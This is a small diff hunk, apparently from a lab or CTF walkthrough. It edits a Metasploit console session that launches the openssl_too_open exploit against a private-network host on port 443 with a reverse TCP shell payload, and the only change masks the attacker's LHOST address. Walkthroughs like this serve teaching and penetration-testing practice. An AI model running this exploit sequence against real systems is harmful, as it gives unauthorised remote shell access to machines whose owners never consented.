@@ -373,7 +373,7 @@ msf> use exploit/linux/ssl/openssl_too_open
 msf exploit(linux/ssl/openssl_too_open)> set RHOSTS 192.168.100.7
 msf exploit(linux/ssl/openssl_too_open)> set RPORT 443
 msf exploit(linux/ssl/openssl_too_open)> set PAYLOAD linux/x86/shell_reverse_tcp
-msf exploit(linux/ssl/openssl_too_open)> set LHOST 192.168.100.3
+msf exploit(linux/ssl/openssl_too_open)> set LHOST 192.168.100.x
 msf exploit(linux/ssl/openssl_too_open)> set LPORT 4444
 msf exploit(linux/ssl/openssl_too_open)> exploit
 ```
